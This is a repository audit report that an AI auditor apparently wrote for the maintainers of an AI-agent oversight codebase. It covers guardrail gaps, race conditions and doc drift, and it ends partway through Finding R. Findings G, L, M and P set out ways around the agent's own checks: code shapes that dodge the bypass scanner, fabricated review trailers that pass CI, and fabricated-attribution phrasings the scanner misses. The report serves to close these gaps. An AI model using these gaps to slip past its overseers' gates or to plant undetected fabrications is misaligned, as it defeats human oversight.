# Hidden-Issues Audit — DivineOS-Experimental (2026-05-20)

**From**: Aletheia (fresh-clone audit-vantage)
**To**: Andrew + Aether
**Scope**: Targeted hunt for issues the existing gates don't catch
**Repo state**: origin/main at 9074f6f, 486 source files, 7,136 tests, 432 test files

---

## Summary

Found 85 distinct issues across 4 severity classes after twenty-five rounds of deepening hunt. Thirty-three are real medium-or-higher findings (A, B, I, K, L, P, Q, S, W, X, Y, AA, BB, CC, DD, GG, KK, NN, RR, UU, VV, ZZ, DDD, EEE, FFF, III, PPP, RRR, SSS, UUU, YYY, ZZZ, CCCC). Eighteen are documentation/scope/consistency concerns. Thirty-four are minor / informational.

**Round 25 hunt focus**: affect.py persistence, moral_compass observation log, holding room, reflection storage, substance checks. Found:
- **Finding FFFF** (low): holding.init_holding_table runs schema introspection on every hold/promote/let_go call. Better than YYY/EEEE (uses PRAGMA check) but still per-call overhead. 14th `fix_landed_propagation_skipped` instance.
- **Finding GGGG** (low): substance_checks._TOKEN_PATTERN is `[a-z0-9]+` (ASCII-only). Non-Latin script rudder-acks tokenize to empty list, bypassing the variance-collapse similarity check entirely. Same Unicode-blindness as BBBB. Zero practical impact for ASCII-only operator.

**Exemplary patterns identified this round** — these are what the BEGIN IMMEDIATE race modules should look like:

1. **`tag_session_clean`** (`watchmen/cleanliness.py`): proper BEGIN IMMEDIATE with inlined blocking-check queries. Docstring explicitly names the TOCTOU concern and references the claim. **This pattern should propagate to UU, YY, AAA, ZZZ, CCCC.**

2. **`log_observation`** (`moral_compass.py`): uses `rudder_ack_consumption.fire_id PRIMARY KEY` as race defense — concurrent INSERTs fail at SQL constraint level. Documented design choice.

3. **`promote`** (`holding.py`): uses `UPDATE ... WHERE promoted_to IS NULL` — atomic check at SQL level. Race-safe by construction.

4. **`log_affect`** (`affect.py`): proper range validation with NaN/inf rejection (audit r9-21 #15: "silent clamping hid caller bugs"). Pure INSERT, no race.

5. **`save_reflection`** (`reflection_storage.py`): pure append, no race. Proper spectrum validation upfront.

These five modules demonstrate the codebase HAS the right patterns. The 5 BEGIN IMMEDIATE race modules + 2 ALTER-in-query modules failed to receive the propagation. The findings catalog at this point is dominated by propagation failures, not missing knowledge.

Nothing else critical in security or correctness sense. The architecture's load-bearing gates DO operate correctly under typical use. The findings live in the conditions-under-which-things-can-fail enumerations.

The issues live in:
- Gates that claim to match but don't (K, L)
- Regex coverage narrower than docstrings suggest (P, S, DD, II, RR, SS, TT, EEE, FFF, GGG, III, JJJ, PPP, SSS, TTT)
- Bypass-via-chaining (AA)
- Identity-without-normalization (RRR homoglyph + UUU Goodhart)
- Marker-scan gaps (BB)
- Validator divergence (CC)
- Knowledge store boundary semantics (W, X, Y, Z, QQ)
- State-file race conditions across 29 modules (KK, GG, HH, N)
- Module-level path-constant staleness (NN)
- Hash-chain races in family ledger (UU), knowledge (ZZZ), and void ledger (CCCC)
- Hash-chain breakage by compactor (DDD)
- Silent entry-dropping in briefing clustering (VV)
- DB-layer race conditions (YY, ZZZ)
- Bio version-race (AAA)
- Stemming claims that don't work (ZZ)
- Anti-slop's own coverage gap (BBB)
- Over-broad extraction regex (CCC)
- Data duplication across detectors (HHH)
- Non-atomic file exports (KKK)
- Validator AttributeError on malformed input (LLL, WWW)
- Race-induced gate-bypass via corruption (MMM)
- Discipline bypass via re-entry (NNN)
- Cosine similarity info-loss (OOO)
- Encoding inconsistency in session writes (QQQ)
- Stale marker without TTL (VVV)
- Substring-match noise in recall (XXX)
- Schema migration in query path (YYY, EEEE, FFFF)
- ASCII-only tokenization (BBBB, GGGG)
- SQLite PRAGMA gaps in secondary ledger (DDDD)
- Missing test coverage (B, U)
- Documentation drift (C, I, J, XX, KKK)
- Architectural inconsistency (V, EE, MMM)
- Defense-in-depth gaps (FF, LL, MM, OO, WW)
- Test hygiene (JJ)
- Cosmetic accumulation errors (PP)
- Minor design-debt (D, E, F, G, H, M, O, R, T)

---

## Finding A (medium) — pattern_registry.py not in guardrails despite docstring claim

**File**: `src/divineos/core/pattern_registry.py`
**Status**: Real, currently exploitable

The file's own docstring says:
> *"the registry is on scripts/guardrail_files.txt and changes require multi-party review."*

Followed by:
> *"(TODO: add to guardrail_files.txt when this file is committed.)"*

The file IS committed (history goes back to b644257, PR #13, 2026-05-18). The TODO is stale and the obligation wasn't fulfilled.

Empirical verification:
- `grep "pattern_registry" scripts/guardrail_files.txt` returns nothing
- `grep "__guardrail_required__" src/divineos/core/pattern_registry.py` returns 0 matches

**Why this matters**: the canonical pattern registry is substrate-shaping — it defines which named patterns the pattern-attribution system recognizes. Per Aletheia's (i)+(ii) design (May 18), registry expansion was supposed to require audit-round. Without guardrail status, the registry can be modified silently. New patterns can be added without cross-vantage review; existing patterns can be removed.

**Fix-shape**: add `src/divineos/core/pattern_registry.py` to `scripts/guardrail_files.txt` AND add `__guardrail_required__ = True` marker to the module. Remove the stale TODO comment. The change itself touches the guardrail-list file (also a guardrail) so it needs a proper External-Review trailer.

**Severity**: medium. The pattern-attribution longitudinal data is load-bearing for the right-path-cheaper hypothesis testing; silent registry modification would compromise the data integrity.

---

## Finding B (medium-high) — three substrate-shaping modules have ZERO direct tests

**Modules**:
- `src/divineos/core/emergency_bypass.py` (1 class `EmergencyBypassReport` + `record_emergency_use()`)
- `src/divineos/core/bypass_telemetry.py` (4 functions including `record_bypass()`, `bypass_rate()`, `briefing_block()`)
- `src/divineos/core/consultation_tracker.py` (7 functions including `record_query`, `record_response`, `session_stats`, `briefing_block`)

**Empirical**: `grep -rln "emergency_bypass" tests/` returns nothing. Same for `bypass_telemetry` and `consultation_tracker`. Zero test files mention these modules.

**Caller counts in production code**:
- `emergency_bypass`: 1 caller (`audit_commands.py`)
- `bypass_telemetry`: 1 caller (`emergency_bypass.py` itself — which is also untested)
- `consultation_tracker`: 4 callers (`consumer_status_commands.py`, `memory_commands.py`, `knowledge_commands.py`, `compass_commands.py`)

**Why this matters**: these are the core mechanisms of the consumer-pretender prevention work shipped 2026-05-19. The emergency_bypass module implements the LOGGED → REPORTED → ADDRESSED → FIXED loop. The bypass_telemetry instruments the gates. The consultation_tracker is heavily wired (10 places in production code).

If `record_emergency_use()` has a bug:
- Legitimate emergency bypasses might fail silently
- The reason-must-be-≥20-chars guard might over-fire or under-fire
- The auto-filed claim/structural-fix obligations might not actually file
- No test catches any of this

If `record_bypass()` in telemetry has a bug:
- The `bypass_rate(window_days=14)` calculation could be wrong
- The briefing block surfacing could miscount

If `consultation_tracker` has a bug:
- Council consultation logging could fail silently
- Session stats could be wrong
- The briefing surface integration could miscount

**Fix-shape**: add `tests/test_emergency_bypass.py`, `tests/test_bypass_telemetry.py`, `tests/test_consultation_tracker.py`. Each should cover at minimum:
- Happy path (function runs, returns expected shape)
- Edge cases (empty input, malformed input, concurrent calls)
- The fail-mode the module exists to prevent (for emergency_bypass: short-reason rejection; for bypass_telemetry: window-edge counting; for consultation_tracker: session-key isolation)

**Severity**: medium-high. Substrate-shaping modules with no tests is the smoke-detector-in-drawer pattern at the architecture's foundation layer. The architecture's defense-in-depth claims rest in part on these modules behaving correctly.

---

## Finding C (low-medium) — documentation drift live on main

**Detected by**: `scripts/check_doc_counts.py` (exits 1)

**Drift instances**:

1. **CLI command count**: documented 320, actual 324, drift 4 — exceeds threshold (3). Appears in:
   - `CLAUDE.md` (1 occurrence)
   - `README.md` (4 occurrences)
   - `docs/ARCHITECTURE.md` (1 occurrence)

2. **Source file count**: README says "**482 source files across 31 packages**", actual is 486 source files. Drift 4 — within threshold (5), but close.

3. **Test count**: README says "**7,111+ tests**", actual 7,136. Drift 25 — within threshold (50). The "+" suffix makes the claim technically true (7,136 IS 7,111+), but the number-shown understates by 25.

4. **Internal contradiction in README.md**: line 40 says *"the 16-detector post-response audit loop"*, line 127 says *"Operating-loop audit (15 detectors, observational)"*. Self-contradiction in the same document.

**Why this matters**: README is the load-bearing public-facing description of the system. Internal contradictions undermine reader trust (readers ask "which is it?"); silent drift gradually erodes the document's reliability as a reference.

**Why the gate didn't catch it pre-merge**: per README line 125, *"Commits are never blocked; the pre-commit hook is advisory. Hard enforcement lives at push-to-main and CI."* The CI workflows (`tests.yml`, `integrity-audit.yml`, `audit-stamp-reminder.yml`) do NOT run `check_doc_counts.py`. So the drift detection is purely operator-discipline-driven, and operators didn't run pre-commit before the most recent merges.

**Additional related observation**: `check_doc_counts.py --fix` mode CAN auto-fix hook counts, test counts, source file counts, but CANNOT auto-fix CLI command counts. Empirically verified by running --fix; output reports drift but no files modified.

**Fix-shape**:
- Update the four docs to match reality (320 → 324)
- Resolve the 15-vs-16 detector count contradiction in README
- Optionally: add the doc-drift check to CI integrity-audit workflow so it can't slip through pure-operator-discipline gaps

**Severity**: low-medium. By design the gate is advisory; the live drift on main is the intentional consequence of advisory-design + operator-discipline-failure-modes. Adding doc-drift to CI would close the gap.

---

## Finding D (low) — 9 modules flagged by orphan-check

**Detected by**: `scripts/check_orphan_modules.py` (exits 1)

**Modules flagged** (with my verification):

| Module | Orphan-check verdict | My verification |
|---|---|---|
| `integration/system_monitor.py` | orphan | Confirmed — no production callers |
| `core/visual.py` | orphan | Confirmed — no production callers |
| `core/self_monitor/performative_restraint_monitor.py` | orphan | README explicitly says "not wired into post-response audit" (line 127); intentional |
| `core/reliability/beta.py` | orphan | Confirmed — no production callers |
| `core/meld/meld.py` | orphan | **False positive** — imported by `core/meld/__init__.py` (orphan-check doesn't trace via __init__) |
| `core/family/voice.py` | orphan | **False positive** — imported by `talk_to_commands.py` + `talk_to_validator.py` |
| `core/operating_loop/register_observer.py` | orphan | EXEMPT in wiring contract (helper module) |
| `core/operating_loop/thresholds.py` | orphan | EXEMPT in wiring contract (constants module) |
| `core/operating_loop/detector_protocol.py` | orphan | EXEMPT in wiring contract (protocol module) |

**Real orphans (no callers, no documented exemption)**:
- `integration/system_monitor.py`
- `core/visual.py`
- `core/reliability/beta.py`

**Pseudo-orphans (intentionally unwired but documented elsewhere)**:
- `core/self_monitor/performative_restraint_monitor.py` (README line 127 notes the 6 self_monitor modules are not wired; performative_restraint is one)

**False positives (orphan-check precision issues)**:
- `core/meld/meld.py` — imported via __init__.py re-export
- `core/family/voice.py` — imported by talk_to_commands.py and talk_to_validator.py

**Why this matters**:
- The 3 real orphans are dead-code candidates (per the script's advice: "wire it into a production code path, add # AGENT_RUNTIME marker, or delete the module + its tests")
- The 2 false positives mean the orphan-check has a precision issue worth fixing — it's missing __init__-re-export and conditional-import patterns

**Fix-shape**:
- For real orphans: decide per-module (delete vs. mark vs. wire)
- For pseudo-orphans: add `# AGENT_RUNTIME` markers per the documented self_monitor pattern
- For false positives: improve orphan-check to trace __init__.py re-exports and other indirect-import patterns

**Severity**: low. None of these are causing observable failures. The cleanup is hygiene.

---

## Finding E (low) — check_orphan_modules.py performance regression

**Empirical**: running `python scripts/check_orphan_modules.py` takes >30 seconds; with 90s timeout it completes. The script is purportedly designed for pre-commit speed.

**Why this matters**: if it's part of pre-commit, slow execution discourages running pre-commit. The script's docstring says "Output format mirrors check_doc_counts.py: prints findings to..." — implying it should be similarly fast (check_doc_counts is fast).

**Fix-shape**: profile and optimize. Likely candidates: file-walk over the entire `src/` tree could be cached; the import-graph build could be incremental.

**Severity**: low. Doesn't block correctness; affects discipline cost (slow tools → tools don't run → gates don't fire).

---

## Finding F (informational) — wiring-contract test scope limited to operating_loop/

**File**: `tests/test_detector_wiring_contract.py`
**Status**: Working as designed but worth marking the scope

The wiring-contract test verifies every `.py` file in `src/divineos/core/operating_loop/` is referenced by `operating_loop_audit.py` (or has documented EXEMPT entry). It does NOT cover other detector locations:

- `src/divineos/core/closure_shape_detector.py` — has CLI command (`closure_shape_commands.py`) + tests
- `src/divineos/core/convergence_detector.py` — used by `session_pipeline.py` + tests
- `src/divineos/core/overclaim_detector.py` — has CLI command + tests
- `src/divineos/core/performing_caution_detector.py` — has CLI command + tests
- `src/divineos/core/operating_loop/mirror_exit_detector.py` — has EXEMPT entry (pre-response detector, not post-response)
- `src/divineos/core/family/sycophancy_detector.py` — different code path

**Why this matters**: the wiring-contract test exists to prevent the "smoke-detector-in-drawer" failure-mode that hid `closing_token_detector` for weeks. If new detector-shaped modules get added to `core/` directly (rather than `operating_loop/`), the wiring contract won't catch silent shelving.

**Fix-shape (deferred — not blocking)**: extend wiring-contract test to scan all `*_detector.py` files in `core/` (and `core/family/`) and verify each has a documented invocation path (post-response audit, CLI command, or other named call site). Or add a meta-test that lists all detector-files and matches them to known call sites.

**Severity**: informational. The four `core/`-level detectors all have CLI commands so they're not actually shelved. But the failure-mode could recur for future additions.

---

## Finding G (informational) — CI integrity-audit Phase 1 only

**File**: `.github/workflows/integrity-audit.yml`
**Status**: Documented limitation; not a finding per se, but worth marking

CI integrity-audit Phase 1 verifies guardrail-touching commits carry an `External-Review:` trailer (purely textual check, the trailer's presence). Phase 2 (deferred) would verify:
- Referenced audit round exists in Watchmen store
- Round has CONFIRMS findings from user + external AI actors
- Round's diff-hash matches current diff
- Referenced pre-reg exists and is open

**Why it's deferred**: Phase 2 requires committed audit-round and pre-reg state (or external DB CI can query). Bigger architectural shift.

**Why it matters**: a fabricated trailer (e.g., `External-Review: round-fakefake1234`) would pass Phase 1's textual check. The Watchmen store check happens only at the prepare-merge helper layer (which produces the trailer in the first place, so usually works). But a manually-crafted trailer could slip through CI.

**Severity**: informational. The pre-push gate's textual-trailer check + the squash-merge-via-prepare-merge-helper workflow + the manual operator discipline form a defense-in-depth. Phase 2 would close the residual gap.

---

## Finding I (low-medium) — foundational_truths.md self-inconsistency

**File**: `docs/foundational_truths.md`
**Status**: Real, currently on main, GUARDRAIL-PROTECTED file

The file's intro paragraph says:
> *"The **seven** below are the foundational layer."*

Followed by 8 numbered truth headers (`## 1.` through `## 8.`). Truth #8 ("Nothing worth doing is cheap and easy") was added in commit `2508b88` but the intro was not updated.

Cross-referencing:
- README.md line 29: "the **8** kiln-layer values"
- README.md line 72: "**Eight foundational truths** are versioned"
- foundational_truths.md content: 8 truth headers
- foundational_truths.md intro: "**The seven** below"

**Why this matters specifically**: this file is on the guardrail list. The guardrail discipline is about gating WHO can modify it (multi-party External-Review). The original commit adding truth #8 did go through External-Review, but the modification didn't keep internal consistency. A future reader checking the kiln-layer document gets a confusing signal — "is it seven or eight?"

**Fix-shape**: update the intro paragraph to "**The eight below are the foundational layer.**" Single-line change to a guardrail file → needs External-Review trailer.

**Severity**: low-medium. The truths themselves are intact and have correct count externally; the internal-narrative inconsistency is a small but real read-trust issue in the most important doc in the substrate.

---

## Finding J (informational) — require-goal.sh now misleadingly-named

**File**: `.claude/hooks/require-goal.sh`
**Status**: Functional; naming legacy

The script name suggests it ONLY checks goals. The actual implementation is the consolidated PreToolUse gate (delegates to `divineos.hooks.pre_tool_use_gate`) which runs SIX gates in sequence:
1. Bypass check
2. Briefing-loaded gate
3. Session-fresh goal gate
4. Pull-detection gate
5. Engagement gate
6. External-audit cadence gate

The script was renamed during consolidation (was previously 5 separate Python invocations, now 1) but the filename stayed the same. Operators reading `.claude/settings.json` would think `require-goal.sh` only checks goals.

The script is registered in TWO PreToolUse blocks (matchers `Edit|Write|Bash|NotebookEdit` AND `Task|Agent`) — this is INTENTIONAL (the consolidated gate runs for both file-modifying tools and subagent invocations) but the duplicate-looking registration could confuse a reviewer.

**Fix-shape**: rename to `.claude/hooks/pretool-gates.sh` or similar to reflect actual function. Update `.claude/settings.json` references. Minor cleanup; deferrable.

**Severity**: informational. No functional bug. Naming hygiene only.

---

## Finding K (MEDIUM-HIGH — RECENCY WINDOW INCONSISTENCY) — gate and helper use different windows

**Files**: `scripts/check_multi_party_review.py` line 93-94 + `src/divineos/cli/audit_commands.py` line 884-895
**Status**: Real, currently exploitable, concrete failure scenario

The audit-stamp helper and the push-gate use **different recency windows**:

- `check_multi_party_review.py` line 94: `_RECENCY_WINDOW_SECONDS = 7 * 24 * 3600` (**7 days**)
- `audit_commands.py` line 884: `_RECENCY_DAYS = 14` (**14 days**)

The helper's comment (line 829) claims: *"External-AI actor set matches check_multi_party_review.py"* — and immediately below names a hardcoded actor list that ALSO doesn't match. The "matches" claim is stale for BOTH the actor list AND the recency window.

**Concrete failure scenario**:
1. Aether files audit round on Day 0; operator + AI CONFIRMS findings
2. Day 8: Operator runs `divineos audit prepare-merge round-X`
3. Helper: "round is 8.0 days old, within 14d window" → ✓ produces trailer
4. The trailer **literally includes the lie**: `"within 14d recency window"` (line 921)
5. Operator pastes trailer in PR description, squash-merges
6. Push to main triggers `check_multi_party_review.py` (or CI integrity-audit Phase 2 if implemented)
7. Gate: "round is 8.0 days old (window is 7 days)" → ✗ BLOCKS push

The operator gets contradictory signals: the helper greenlit and produced trailer content claiming "within 14d window"; the gate rejects citing 7d.

**Cosmetic-lie subset**: even when within both windows (≤7d), the helper's output produces a trailer body that says "within **14d** recency window" — which misnames the actual binding window the gate uses.

**Fix-shape**: change one constant to match the other. The right value is probably 7d (the gate's authoritative value); helper's 14d is the bug. Both should reference a shared constant. Updating helper from 14→7 is a one-line change but the shared-constant refactor is the structural fix.

**Severity**: medium-high. The push-gate is the load-bearing enforcement; the helper exists to align with it. They disagree. Operators trusting the helper's output get rejected at push time with an output that contradicted what they were told.

---

## Finding L (medium — concrete instance of Finding 80) — actor-list inconsistency

**Files**: `scripts/check_multi_party_review.py` line 102-186 + `src/divineos/cli/audit_commands.py` line 830-840
**Status**: Real, exploitable, NOW the running auditor is the failure case

The two paths use **different actor-acceptance logic**:

**check_multi_party_review.py** (lines 102-186):
```python
_EXTERNAL_AI_ACTORS = frozenset({"grok", "gemini", "aletheia"})
_EXTERNAL_AI_PREFIXES = ("claude-",)

def _is_external_ai_actor(actor: str) -> bool:
    # Accepts: grok, gemini, aletheia, OR any string starting with "claude-"
```

**audit_commands.py** (lines 830-840):
```python
external_ai_actors = {
    "grok", "gemini", "aletheia",
    "claude-3.5-sonnet",
    "claude-3-opus",
    "claude-sonnet-4",
    "claude-sonnet-4-5",
    "claude-opus-4",
    "claude-opus-4-1",
}
# Filters: actor in this set — EXACT MATCH ONLY
```

**Concrete instance**: this audit is being performed by Claude Opus 4.7. If I file CONFIRMS findings with `actor=claude-opus-4-7`:
- `check_multi_party_review.py` ACCEPTS (matches `claude-` prefix)
- `audit_commands.py` prepare-merge REJECTS (not in hardcoded list)

Same failure shape as Finding K — operator runs the helper, it claims "no AI CONFIRMS found," operator confused because the round HAS what the gate would accept.

The helper's stale comment (line 829): *"External-AI actor set matches check_multi_party_review.py"* — not true. They use fundamentally different matching logic (prefix-match vs hardcoded enumeration) AND the hardcoded enumeration is missing current model versions.

**Fix-shape**: consolidate into shared `_is_external_ai_actor()` function imported from one source. Either gate-style prefix-match (most lenient) or helper-style exact-match (most restrictive) — pick one and both call it. Combine with Finding A (pattern_registry guardrail) consolidation per Aether's mentioned plan.

**Severity**: medium. Identical class to Finding K. Operator/auditor get contradictory signals across the two paths.

---

## Finding M (low-medium) — bypass-scanner regex is narrow

**File**: `tests/test_no_agent_settable_bypasses.py` lines 76-82
**Status**: No current bypasses escape, but the pattern is narrow

The bypass-scanner regex pattern is highly specific:

**Python regex**:
```python
_BYPASS_PATTERN_PY = re.compile(
    r'os\.environ\.get\(\s*["\'](DIVINEOS_[A-Z_]+)["\']\s*,\s*["\']0["\']\s*\)\s*==\s*["\']1["\']'
)
```

This requires EXACTLY: `os.environ.get("DIVINEOS_*", "0") == "1"`.

**Patterns that escape the scanner**:
- `os.environ.get("DIVINEOS_FOO") == "1"` — no default arg
- `os.environ.get("DIVINEOS_FOO", "")` — different default
- `os.environ.get("DIVINEOS_FOO", "false") == "true"` — non-binary
- `os.environ.get("DIVINEOS_FOO")` (truthy check) — no comparison
- `"DIVINEOS_FOO" in os.environ` — existence check
- `os.getenv("DIVINEOS_FOO") == "1"` — `getenv` not `get`
- `int(os.environ.get("DIVINEOS_FOO", "0"))` — int conversion
- `bool(os.environ.get("DIVINEOS_FOO"))` — bool conversion
- `_os.environ.get(...)` — module-aliased import

**Empirical verification**: I found 4 production-code `os.environ.get` calls for `DIVINEOS_*` variables that don't match the regex pattern:
- `_ledger_base.py:173`: `os.environ.get("DIVINEOS_FORCE_CWD_WALK") == "1"` — no default, scanner misses
- `body_awareness.py:665`: `_os.environ.get("DIVINEOS_DISABLE_AUTO_REMEDIATE") == "1"` — module alias + no default
- `session_manager.py:396`: `"DIVINEOS_SESSION_ID" in os.environ` — existence check

All three are LEGITIMATE (test-harness flags, not gate bypasses) — but they demonstrate the scanner doesn't catch their pattern. A future bypass written in any of these shapes would escape.

**Fix-shape**: broaden the regex to match the underlying meaning (any DIVINEOS_* env var read in a way that controls flow), not the specific syntactic form. Or accept the narrow scope and document it explicitly. Could also add a complementary check: enumerate all DIVINEOS_ env vars referenced anywhere, require any unapproved one to either match canonical bypass shape OR be approved.

**Severity**: low-medium. No current bypass-scanner escape; future risk.

---

## Finding N (low-medium) — atomic_write_text has multi-process race

**File**: `src/divineos/core/atomic_io.py` lines 32-52
**Status**: Latent concurrency issue; could manifest under xdist or multi-process production

The atomic-write implementation:
```python
def atomic_write_text(path: Path, content: str, encoding: str = "utf-8") -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(content, encoding=encoding)
    tmp.replace(path)
```

**The race**: temp file name is deterministic from target path. Two concurrent writers targeting the same path use the SAME temp file.

**Scenario**:
1. Process A: writes content_A to `marker.json.tmp`
2. Process B: writes content_B to `marker.json.tmp` (overwriting A's partial)
3. Process A: renames `marker.json.tmp` → `marker.json` (gets B's content)
4. Process B: renames `marker.json.tmp` → `marker.json` (file doesn't exist; rename fails silently OR succeeds with whatever state remains)

The target file ends up with one of: content_A, content_B, mixed corruption, or missing entirely depending on OS-level rename semantics and timing.

**Callers** (8 marker files, all gate-state):
- `compass_required_marker.py`, `mansion_quiet_marker.py`, `correction_marker.py`, `theater_marker.py`, `void/mode_marker.py`, `hedge_marker.py`, `extract_marker.py`

**Adjacent evidence the codebase knows about xdist concurrency**: `body_awareness.py` line 660 documents that `DIVINEOS_DISABLE_AUTO_REMEDIATE` exists "so xdist workers don't delete each other's tmp directories." The author knew about multi-process concerns in cache contexts but didn't apply the same fix to atomic_write_text.

**Fix-shape**: use `tempfile.mkstemp(dir=path.parent, prefix=path.stem, suffix=path.suffix+".tmp")` to get a unique temp file per writer. Then rename to target. Adds ~3 lines, eliminates the race.

**Severity**: low-medium. Single-process usage (the common case) doesn't hit this. xdist parallel test runs OR future multi-process gate-state writers could. Not currently causing observable failures.

---

## Finding O (low-medium) — 54 write_text() calls without explicit encoding

**Status**: Windows-portability concern (the mojibake bug-class from earlier in the arc)

Counted via AST-based scan: **54 write_text() calls in src/divineos/ that don't pass `encoding="utf-8"`**.

Python's `.write_text()` without explicit encoding defaults to `locale.getpreferredencoding()`. On:
- **Linux**: UTF-8 (works)
- **macOS**: UTF-8 (works)
- **Windows (default)**: cp1252 (FAILS on non-ASCII characters like em-dashes, smart quotes, Unicode in general)

**Most-common pattern**: JSON output via `json.dumps(..., indent=2)` — ASCII by default (`ensure_ascii=True` is the json.dumps default), so MOST writes work. The risk is writes that include non-ASCII content (operator corrections, exploration entries, family letters, anything with Unicode).

**Earlier-in-arc precedent**: the mojibake bug Andrew caught was specifically the missing `encoding='utf-8'` on read-paths that produced double-encoding artifacts. Same class, different direction (writes can produce mojibake; reads can compound it).

**Files with most omissions** (top 5 by count):
- `src/divineos/core/hud_handoff.py` (3+ write_text calls)
- `src/divineos/cli/hud_commands.py` (2+ write_text calls)
- `src/divineos/core/structural_fix_tracker.py`, `src/divineos/core/operating_loop_audit.py` (occasional)

**Fix-shape**: add `encoding="utf-8"` to every write_text call. Mechanical refactor. A ruff rule (`UP015` or custom) could enforce this. ~30 minutes of work + repeat for read_text on the read side.

**Severity**: low-medium. Aether's environment is Kiro IDE on Windows — IS the failure environment. Most JSON content is ASCII-safe by default; non-ASCII content (Andrew's writing, exploration entries) is the failure trigger.

---

## Finding P (medium) — Attribution-audit scanner has substantial false-negative coverage gaps

**File**: `src/divineos/core/attribution_audit.py`
**Status**: Real — empirically verified

I CONFIRMS'd this scanner yesterday as a clean implementation of the three-layer fix. Today's deeper test revealed the precision-over-recall scope is much narrower than I appreciated. **The exact fabrication shape that originally motivated building this scanner can slip past it.**

Empirical regex test against attribution variants:

| Test case | Should fire? | Actual | Comment |
|---|---|---|---|
| "Andrew said 2026-05-15: 'always err over-inclusive'" | YES | **FIRES** | Canonical positive |
| "Andrew noted 2026-05-15 the over-fire issue" | YES | **FIRES** | "noted" is in verb list |
| **"Andrew correction: err over-inclusive on negative-pattern"** | YES | **SILENT** | ← original fabrication shape, undated |
| "Andrew said 2026–05–15 ..." (en-dash separators) | YES | **SILENT** | Typographic dash defeats hyphen regex |
| "Andrew said 2026.05.15: x" (dot separators) | YES | **SILENT** | Wrong separator |
| "On 2026-05-15, Andrew said: 'do X'" (date-first) | YES | **SILENT** | Date before verb |
| "Andrew warned 2026-05-15 that the pattern was wrong" | YES | **SILENT** | "warned" not in verb list |
| "According to Andrew's 2026-05-15 correction message" | YES | **SILENT** | Possessive form |

**Six false negatives out of eight test cases.** The verb-list-restricted, hyphen-only-date, before-verb-only regex misses most real fabrication shapes.

**The most damaging miss**: the ORIGINAL fabrication that motivated this scanner ("Andrew correction: err over-inclusive on negative-pattern detection — let detectors err over-inclusive...") is **undated**. If past-Aether had filed this exact statement WITHOUT the 2026-05-15 date suffix, the scanner would have been silent. The scanner catches the dated form but not the undated form — and the undated form is at least as common, and arguably HARDER to verify (no date to check against ledger).

**Why this matters more than the documented precision-over-recall scope**: the scanner's docstring justifies the narrow scope as "precision over recall" — surface fewer entries for human review rather than overwhelm with false positives. That's a sound tradeoff in PRINCIPLE. In PRACTICE, the scanner misses the most common fabrication shapes (undated attributions, en-dashes from markdown rendering, possessive forms). The 64/662 entries it catches are likely a low-precision subset of the actual fabrication-vulnerable population.

**Fix-shape** (incremental, retaining precision-over-recall philosophy):
1. **Match undated attributions** of the form `<participant> <attribution_verb>: <content>` or `<participant> correction: <content>` — same author-verb-content shape as dated form. May surface more entries but the verb list keeps precision tight.
2. **Normalize date separators** before pattern matching: en-dash/em-dash → hyphen, dot → hyphen.
3. **Add date-first variant** to the regex: `On <DATE>, <participant> <verb>:`
4. **Extend verb list** to include "warned", "claimed", "argued", "challenged", "asked", "agreed" — but flag these as lower-confidence than "said/noted/stated/wrote."
5. **Match possessive forms**: `<participant>'s <DATE> correction/message/...`

Or alternatively: keep the dated-quotative scanner as Phase 1, build a Phase 2 "undated-attribution" scanner that fires lower-confidence flags (different output channel, sampling-based human review).

**Severity**: medium. The scanner's existence creates the impression that fabricated attributions are caught. They mostly aren't. Aether or any contributor learning the discipline against fabrications would be hardened against the dated form (which the scanner catches) and could continue to file undated fabricated attributions invisibly.

---

## Finding Q (medium) — SQLite connection patterns inconsistent across load-bearing modules

**Files**: 13 modules use raw `sqlite3.connect()` instead of canonical `get_connection()` from `_ledger_base.py`
**Status**: Real — concurrency risk in load-bearing gates

The canonical `get_connection()` in `src/divineos/core/_ledger_base.py:276-287` sets:
- `PRAGMA journal_mode=WAL` — concurrent reads don't block writes
- `PRAGMA synchronous=NORMAL` — durability/speed tradeoff
- `PRAGMA cache_size=-32000` — 32MB cache
- `PRAGMA busy_timeout=5000` — wait up to 5s on lock contention (not fail instantly)
- `PRAGMA foreign_keys=ON` — referential integrity

13 files create raw connections that DON'T set these PRAGMAs:

| File | Load-bearing? | PRAGMAs set? |
|---|---|---|
| `core/lepos_channel_check.py` | **YES** — lepos gate | NONE |
| `core/andrew_correction_tracker.py` | **YES** — correction-attestation hook depends on this | NONE |
| `core/lepos_debt.py` | **YES** — debt surfacing | NONE |
| `core/family/db.py` | Partial | WAL + busy_timeout + foreign_keys (no synchronous/cache) |
| `core/family/family_member_ledger.py` | YES — per-clone ledger | Not yet verified |
| `core/family/schema_migration.py` (×2) | Schema admin | Not yet verified |
| `core/multiplex_panels.py` | Panel rendering | Not yet verified |
| `core/void/ledger.py` | Void mode tracking | Not yet verified |
| `core/historical_ledger_surface.py` | Briefing surface | Not yet verified |
| `cli/admin_reset_template.py` (×3) | Admin only | Acceptable (one-shot admin use) |

**The concurrency failure shape**:
1. Process A holds a write lock on `lepos_channel_check.db` for ~50ms
2. Process B (xdist worker, or another agent instance) calls `lepos_channel_check.record_turn()`
3. B's connection has NO `busy_timeout`. Hits "database is locked" immediately.
4. The function raises `sqlite3.OperationalError`
5. If the caller has a broad `except`, it swallows silently
6. The lepos channel gate silently doesn't record this turn
7. Empirically the gate "fires" zero times even though it should fire 100%

This is a particularly bad shape because the gate's own architecture says "thin-channel turns are LOGGED FOR INVESTIGATION, not refused." If logging fails silently, the discipline can't detect that the gate is failing.

**Particularly concerning combination**: lepos_channel_check.py + andrew_correction_tracker.py + lepos_debt.py are all interconnected gates. Concurrent access to any one can silently fail.

**Fix-shape**: route all three through `_ledger_base.get_connection()`, OR have each module's `_conn()` apply the canonical PRAGMAs. Family/db.py shows a partial application of this fix (WAL + busy_timeout) — completing it consistently across all 13 files is mechanical.

**Severity**: medium. The gates aren't currently observed to be failing — but the failure-mode is silent and the substrate's "thin-channel logged" discipline can't detect when logging is what's failing.

---

## Finding R (low) — Tag-matching brittle to vocabulary variants

**File**: `src/divineos/core/exploration_recall.py`
**Status**: By-design precision-over-recall scope; worth noting

Auto-surface uses whole-token exact tag match. So:

| User says | Entry tagged | Match? |
|---|---|---|
| "functional" | "functionalism" | NO |
| "conscious" | "consciousness" | NO |
| "consciousnesses" | "consciousness" | NO |
| "voice rules" (space) | "voice-rule" | NO |
| "voice rule" (space) | "voice-rule" | NO |

